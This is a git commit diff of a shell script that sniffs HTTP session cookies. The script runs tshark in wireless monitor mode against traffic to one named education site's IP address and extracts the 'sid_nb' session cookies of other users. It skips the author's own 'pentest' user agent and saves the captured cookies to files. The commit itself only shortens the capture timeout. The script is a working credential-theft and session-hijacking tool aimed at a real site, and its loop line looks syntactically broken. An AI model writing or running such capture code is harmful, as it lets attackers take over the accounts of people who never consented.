971f43be447da0d73e4c5befc2151c58e9ea1047
WALT-WANG <walterwang.inboxes@gmail.com>
2017-09-07 22:20:48 +0800

    huge change

--- autotshark_cookies/get_cookies.sh
+++ autotshark_cookies/get_cookies.sh
@@ -3,7 +3,7 @@ while True;
 	do
 	clear
 	if ping -o www.alevel.com.cn; then
-		gtimeout 60 tshark -I -i en0 -f 'dst host 210.22.15.252' -Y "(http.cookie_pair contains sid_nb) && !(http.user_agent == "pentest")" -Tfields -e 'http.cookie_pair' > raw_cookies.txt 
+		gtimeout 10 tshark -I -i en0 -f 'dst host 210.22.15.252' -Y "(http.cookie_pair contains sid_nb) && !(http.user_agent == "pentest")" -Tfields -e 'http.cookie_pair' > raw_cookies.txt 
 		cat raw_cookies.txt | uniq >> less_cookies.txt
 	fi
 done
